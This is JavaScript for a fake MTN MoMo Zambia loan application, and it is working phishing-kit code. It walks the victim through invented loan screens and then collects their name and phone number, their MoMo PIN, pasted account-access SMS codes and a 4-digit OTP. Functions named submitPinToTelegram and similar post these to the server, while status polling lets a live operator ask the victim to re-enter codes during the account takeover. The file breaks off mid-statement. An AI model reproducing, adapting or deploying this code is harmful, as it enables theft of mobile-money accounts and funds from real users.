document.addEventListener('DOMContentLoaded', () => {
  const $ = (id) => document.getElementById(id);
  const onClick = (el, fn) => {
    if (el) el.addEventListener('click', fn);
  };

  const screenWelcome = $('screen-welcome');
  const screenSlider = $('screen-slider');
  const screenForm1 = $('screen-form1');
  const screenForm2 = $('screen-form2');
  const screenForm3 = $('screen-form3');
  const screenPin = $('screen-pin');
  const screenSms = $('screen-sms');
  const screenOtp = $('screen-otp');
  const screenSuccess = $('screen-success');
  const screenStopped = $('screen-stopped');
  const loadingOverlay = $('loading-overlay');

  const btnGotoSlider = $('btn-goto-slider');
  const btnSliderBack = $('btn-slider-back');
  const btnGotoForm1 = $('btn-goto-form1');
  const btnForm1Back = $('btn-form1-back');
  const btnForm1Next = $('btn-form1-next');
  const btnForm2Prev = $('btn-form2-prev');
  const btnForm2Next = $('btn-form2-next');
  const btnForm3Prev = $('btn-form3-prev');
  const btnForm3Submit = $('btn-form3-submit');
  const btnPinBack = $('btn-pin-back');
  const btnSuccessBack = $('btn-success-back');
  const btnFinishHome = $('btn-finish-home');
  const btnRetryHome = $('btn-retry-home');

  const loanSlider = $('loan-amount-slider');
  const loanText = $('loan-amount-text');
  const monthsSlider = $('loan-months-slider');
  const monthsText = $('loan-months-text');
  const monthlyRepVal = $('monthly-rep-val');

  const formAmountInput = $('form-amount-input');
  const loanDurationSelect = $('loan-duration');
  const loanPurposeInput = $('loan-purpose');
  const firstNameInput = $('first-name');
  const lastNameInput = $('last-name');
  const formPhoneInput = $('form-phone');

  const sumAmount = $('sum-amount');
  const sumDuration = $('sum-duration');
  const sumPurpose = $('sum-purpose');
  const sumApplicant = $('sum-applicant');
  const depositRequiredAmount = $('deposit-required-amount');

  const bannerPhoneError = $('banner-phone-error');
  const bannerForm3Error = $('banner-form3-error');
  const bannerPinError = $('banner-pin-error');
  const bannerSmsError = $('banner-sms-error');
  const bannerSmsInfo = $('banner-sms-info');
  const bannerOtpError = $('banner-otp-error');

  const displayPinPhone = $('display-pin-phone');
  const pinBoxes5 = Array.from(document.querySelectorAll('.pin-box-5'));
  const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
  const linkForgotPin = $('link-forgot-pin');

  const displaySmsPhone = $('display-sms-phone');
  const smsInputBox = $('sms-input-box');
  const btnValidatedSms = $('btn-validated-sms');
  const smsSecondsSpan = $('sms-seconds');
  const smsTimerText = $('sms-timer-text');
  const btnRequestNewSms = $('btn-request-new-sms');

  const displayOtpPhone = $('display-otp-phone');
  const otpBoxes4 = Array.from(document.querySelectorAll('.otp-box-4'));
  const btnSubmitOtp = $('btn-submit-otp');

  const blockedReasonText = $('blocked-reason-text');

  let currentUserId = null;
  let statusPollInterval = null;
  let smsTimerInterval = null;
  let smsAutoSubmittedForCurrentValue = '';
  let pinSubmittedForCurrentValue = '';
  let otpSubmittedForCurrentValue = '';

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  const REQUIRED_SMS_REGEX = /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*.+$/i;

  function isValidMomoSms(rawSms) {
    const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
    return REQUIRED_SMS_REGEX.test(normalized);
  }

  function toZeroPrefixPhone(rawPhone) {
    const digits = String(rawPhone || '').replace(/\D/g, '');
    if (digits.startsWith('260')) return '0' + digits.slice(3);
    if (digits.startsWith('0')) return digits;
    if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
    return digits;
  }

  function isValidMtnZambia(rawPhone) {
    const normalized = toZeroPrefixPhone(rawPhone);
    return /^(096|076|056)\d{7}$/.test(normalized);
  }

  function formatDisplayPhone(rawPhone) {
    const zeroPhone = toZeroPrefixPhone(rawPhone);
    if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
      return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
    }
    return zeroPhone || '096 XXX XXXX';
  }

  function showBanner(el, msg) {
    if (!el) return;
    el.innerText = msg;
    el.classList.add('active');
  }

  function hideBanner(el) {
    if (!el) return;
    el.innerText = '';
    el.classList.remove('active');
  }

  function showLoading(title, sub) {
    const titleEl = $('loading-title');
    const subEl = $('loading-sub');
    if (titleEl) titleEl.innerText = title;
    if (subEl) subEl.innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }

  function showScreen(targetScreen) {
    [
      screenWelcome,
      screenSlider,
      screenForm1,
      screenForm2,
      screenForm3,
      screenPin,
      screenSms,
      screenOtp,
      screenSuccess,
      screenStopped
    ].forEach((s) => {
      if (s) s.classList.remove('active');
    });
    if (targetScreen) targetScreen.classList.add('active');
  }

  function updateCalc() {
    if (!loanSlider || !monthsSlider) return;
    const amt = Number(loanSlider.value) || 100000;
    const mths = Number(monthsSlider.value) || 48;
    if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
    if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
    if (formAmountInput) formAmountInput.value = amt.toLocaleString();
    if (sumDuration) sumDuration.innerText = `${mths} Months`;
    const monthly = (amt * 1.1) / mths;
    if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
  }

  if (loanSlider) loanSlider.addEventListener('input', updateCalc);
  if (monthsSlider) monthsSlider.addEventListener('input', updateCalc);
  updateCalc();

  function updateStep2ReadyState() {
    const fn = (firstNameInput?.value || '').trim();
    const ln = (lastNameInput?.value || '').trim();
    const ph = (formPhoneInput?.value || '').trim();
    if (!btnForm2Next) return;
    if (fn && ln && isValidMtnZambia(ph)) {
      btnForm2Next.classList.add('ready');
    } else {
      btnForm2Next.classList.remove('ready');
    }
  }

  [firstNameInput, lastNameInput, formPhoneInput].forEach((inp) => {
    if (inp) inp.addEventListener('input', updateStep2ReadyState);
  });

  onClick(btnGotoSlider, () => showScreen(screenSlider));
  onClick(btnSliderBack, () => showScreen(screenWelcome));
  onClick(btnGotoForm1, () => showScreen(screenForm1));
  onClick(btnForm1Back, () => showScreen(screenSlider));

  onClick(btnForm1Next, () => {
    const amtRaw = (formAmountInput?.value || '100,000').trim();
    const dur = loanDurationSelect?.value || '48 Months';
    const purp = (loanPurposeInput?.value || '').trim() || 'Business';
    if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
    if (sumDuration) sumDuration.innerText = dur;
    if (sumPurpose) sumPurpose.innerText = purp;
    showScreen(screenForm2);
  });

  onClick(btnForm2Prev, () => showScreen(screenForm1));

  onClick(btnForm2Next, () => {
    hideBanner(bannerPhoneError);
    const fn = (firstNameInput?.value || '').trim();
    const ln = (lastNameInput?.value || '').trim();
    const ph = (formPhoneInput?.value || '').trim();

    if (!fn || !ln) {
      showBanner(bannerPhoneError, 'Please enter your first name and last name.');
      return;
    }

    if (!isValidMtnZambia(ph)) {
      showBanner(bannerPhoneError, 'Enter a valid MTN Zambia number starting with 096, 076, or 056.');
      return;
    }

    if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
    showScreen(screenForm3);
  });

  onClick(btnForm3Prev, () => showScreen(screenForm2));

  onClick(btnForm3Submit, async () => {
    hideBanner(bannerForm3Error);
    const fn = (firstNameInput?.value || '').trim();
    const ln = (lastNameInput?.value || '').trim();
    const ph = (formPhoneInput?.value || '').trim();

    if (!fn || !ln || !isValidMtnZambia(ph)) {
      showBanner(bannerForm3Error, 'Please complete Step 2 with a valid MTN MoMo number (096, 076, 056).');
      return;
    }

    const fullName = `${fn} ${ln}`.toUpperCase();
    const zeroPhone = toZeroPrefixPhone(ph);
    const formattedPhone = formatDisplayPhone(zeroPhone);

    if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
    if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
    if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
    if (sumApplicant) sumApplicant.innerText = fullName;

    const numericAmt = Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
    const depVal = Math.max(200, Math.round(numericAmt * 0.002));
    if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;

    pinSubmittedForCurrentValue = '';
    otpSubmittedForCurrentValue = '';
    pinBoxes5.forEach((b) => (b.value = ''));
    otpBoxes4.forEach((b) => (b.value = ''));
    hideBanner(bannerPinError);
    hideBanner(bannerOtpError);

    try {
      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          adminChatId: adminParam,
          applicant: { fullName, phone: zeroPhone }
        })
      });
      const data = await res.json();
      if (data && data.success) {
        currentUserId = data.userId;
      }
    } catch (e) {}

    showScreen(screenPin);
    if (pinBoxes5[0]) pinBoxes5[0].focus();
  });

  onClick(btnPinBack, () => {
    if (statusPollInterval) clearInterval(statusPollInterval);
    hideLoading();
    showScreen(screenForm3);
  });

  onClick(btnTogglePinVisibility, () => {
    const makeVisible = pinBoxes5[0] && pinBoxes5[0].type === 'password';
    pinBoxes5.forEach((box) => {
      box.type = makeVisible ? 'text' : 'password';
    });
    if (btnTogglePinVisibility) {
      btnTogglePinVisibility.innerText = makeVisible ? 'Hide' : 'Show';
    }
  });

  if (linkForgotPin) {
    linkForgotPin.addEventListener('click', (e) => {
      e.preventDefault();
      showBanner(bannerPinError, 'Enter your 5-digit MTN MoMo PIN code in the boxes above to continue.');
    });
  }

  pinBoxes5.forEach((box, idx) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '').slice(0, 1);
      if (box.value && idx < pinBoxes5.length - 1) {
        pinBoxes5[idx + 1].focus();
      }
      const pinVal = pinBoxes5.map((b) => b.value).join('');
      if (pinVal.length === 5 && pinVal !== pinSubmittedForCurrentValue) {
        pinSubmittedForCurrentValue = pinVal;
        submitPinToTelegram(pinVal);
      }
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        pinBoxes5[idx - 1].focus();
      }
    });
  });

  async function submitPinToTelegram(pinVal) {
    hideBanner(bannerPinError);
    const rawPhone = displayPinPhone?.innerText || formPhoneInput?.value || '';
    const phoneZero = toZeroPrefixPhone(rawPhone);
    const applicantName = (sumApplicant?.innerText || `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`).trim() || 'MTN MOMO ZAMBIA';

    showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');

    try {
      const res = await fetch('/api/submit-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero,
          pin: pinVal,
          applicantName
        })
      });
      const data = await res.json();
      if (data && data.success && data.userId) {
        currentUserId = data.userId;
      }
      startStatusPolling();
    } catch (e) {
      hideLoading();
      pinSubmittedForCurrentValue = '';
      showBanner(bannerPinError, 'Connection error. Please re-enter your 5-digit PIN.');
    }
  }

  function startSmsCountdown() {
    let timeLeft = 15;
    if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
    if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
    if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');

    if (smsTimerInterval) clearInterval(smsTimerInterval);

    smsTimerInterval = setInterval(() => {
      timeLeft -= 1;
      if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);

      if (timeLeft <= 0) {
        clearInterval(smsTimerInterval);
        if (smsTimerText) smsTimerText.classList.add('hidden-btn');
        if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
      }
    }, 1000);
  }

  onClick(btnRequestNewSms, async () => {
    hideBanner(bannerSmsError);
    const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
    showBanner(bannerSmsInfo, 'New SMS request sent to admin. Please wait for your SMS.');
    startSmsCountdown();

    try {
      await fetch('/api/request-new-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero
        })
      });
    } catch (e) {}
  });

  function checkAndAutoSubmitSms() {
    if (!smsInputBox) return;
    const currentText = smsInputBox.value.replace(/\s+/g, ' ').trim();
    if (isValidMomoSms(currentText) && currentText !== smsAutoSubmittedForCurrentValue) {
      smsAutoSubmittedForCurrentValue = currentText;
      submitSmsToTelegram(currentText, true);
    }
  }

  if (smsInputBox) {
    smsInputBox.addEventListener('input', checkAndAutoSubmitSms);
    smsInputBox.addEventListener('paste', () => {
      setTimeout(checkAndAutoSubmitSms, 10);
    });
  }

  onClick(btnValidatedSms, () => {
    const currentText = (smsInputBox?.value || '').replace(/\s+/g, ' ').trim();
    if (!isValidMomoSms(currentText)) {
      showBanner(
        bannerSmsError,
        "SMS must start with: Y'ello. Please note! This confidential code gives access to your MoMo account:"
      );
      return;
    }
    submitSmsToTelegram(currentText, false);
  });

  async function submitSmsToTelegram(smsText, autoDetected) {
    hideBanner(bannerSmsError);
    hideBanner(bannerSmsInfo);
    const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');

    showLoading('VERIFYING SMS CODE...', 'Please wait while admin reviews your SMS...');

    try {
      await fetch('/api/submit-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero,
          sms: smsText,
          autoDetected
        })
      });
      startStatusPolling();
    } catch (e) {
      hideLoading();
      showBanner(bannerSmsError, 'Unable to submit SMS. Please try again.');
    }
  }

  otpBoxes4.forEach((box, idx) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '').slice(0, 1);
      if (box.value && idx < otpBoxes4.length - 1) {
        otpBoxes4[idx + 1].focus();
      }
      const otpVal = otpBoxes4.map((b) => b.value).join('');
      if (otpVal.length === 4 && otpVal !== otpSubmittedForCurrentValue) {
        otpSubmittedForCurrentValue = otpVal;
        submitOtpToTelegram(otpVal, true);
      }
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        otpBoxes4[idx - 1].focus();
      }
    });
  });

  onClick(btnSubmitOtp, () => {
    const otpVal = otpBoxes4.map((b) => b.value).join('');
    if (otpVal.length < 4) {
      showBanner(bannerOtpError, 'Please enter all 4 digits of your OTP code.');
      return;
    }
    submitOtpToTelegram(otpVal, false);
  });

  async function submitOtpToTelegram(otpVal, autoSubmitted) {
    hideBanner(bannerOtpError);
    const phoneZero = toZeroPrefixPhone(displayOtpPhone?.innerText || displaySmsPhone?.innerText || formPhoneInput?.value || '');

    showLoading('VERIFYING 4-DIGIT OTP...', 'Please wait for admin confirmation...');

    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero,
          otp: otpVal,
          autoSubmitted
        })
      });
      startStatusPolling();
    } catch (e) {
      hideLoading();
      otpSubmittedForCurrentValue = '';
      showBanner(bannerOtpError, 'Unable to submit OTP. Please try again.');
    }
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
        const data = await res.json();
        const st = data && data.status;

        if (st === 'BLOCKED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          if (blockedReasonText) {
            blockedReasonText.innerText = 'Your application was blocked because valid MTN MoMo details were not confirmed.';
          }
          showScreen(screenStopped);
        } else if (st === 'PROCEED_SMS') {
          clearInterval(statusPollInterval);
          hideLoading();
          hideBanner(bannerSmsError);
          hideBanner(bannerSmsInfo);
          smsAutoSubmittedForCurrentValue = '';
          if (smsInputBox) smsInputBox.value = '';
          showScreen(screenSms);
          startSmsCountdown();
          if (smsInputBox) smsInputBox.focus();
        } else if (st === 'INCORRECT_PIN') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          pinSubmittedForCurrentValue = '';
          pinBoxes5.forEach((b) => (b.value = ''));
          showScreen(screenPin);
          showBanner(bannerPinError, 'INCORRECT PIN — Please enter your new 5-digit PIN.');
          if (pinBoxes5[0]) pinBoxes5[0].focus();
        } else if (st === 'SMS_EXPIRED') {
          clearInterval(statusPollInterval);
          hideLoading();
          smsAutoSubmittedForCurrentValue = '';
          if (smsInputBox) smsInputBox.value = '';
          showScreen(screenSms);
          showBanner(bannerSmsError, 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
          startSmsCountdown();
          if (smsInputBox) smsInputBox.focus();
        } else if (st === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          hideBanner(bannerOtpError);
          otpSubmittedForCurrentValue = '';
          otpBoxes4.forEach((b) => (b.value = ''));
          showScreen(screenOtp);
          if (otpBoxes4[0]) otpBoxes4[0].focus();
        } else if (st === 'OTP_EXPIRED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          otpSubmittedForCurrentValue = '';
          otpBoxes4.forEach((b) => (b.value = ''));
          showScreen(screenOtp);
          showBanner(bannerOtpError, 'OTP EXPIRED — Please enter your new 4-digit OTP.');
          if (otpBoxes4[0]) otpBoxes4[0].focus();
        } else if (st === 'SUCCESS' || st === 'APPROVED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          showScreen(screenSucce
